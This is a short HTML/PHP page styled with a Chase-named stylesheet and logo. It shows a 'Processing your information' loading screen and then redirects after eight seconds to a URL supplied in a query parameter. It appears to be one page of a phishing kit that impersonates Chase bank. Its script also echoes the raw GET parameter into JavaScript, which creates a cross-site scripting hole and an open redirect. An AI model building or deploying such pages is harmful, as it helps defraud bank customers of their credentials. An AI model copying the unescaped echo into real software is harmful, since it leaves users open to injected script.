<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport"
		content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/css/chase.css">
    <title></title>
</head>
<body>

<header>
        <img src="res/img/logo.svg">
    </header>

 <section>
   <div class="Container">

   <div class="colm">
   
      <div class="colm">
      <h2>Please wait...</h2>
        <p>Processing your information...</p>
        <img src="res/img/loading.gif">
      </div>
      
    </div>
 
        
        


      </div>









</section>













<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script>
</body>
</html>  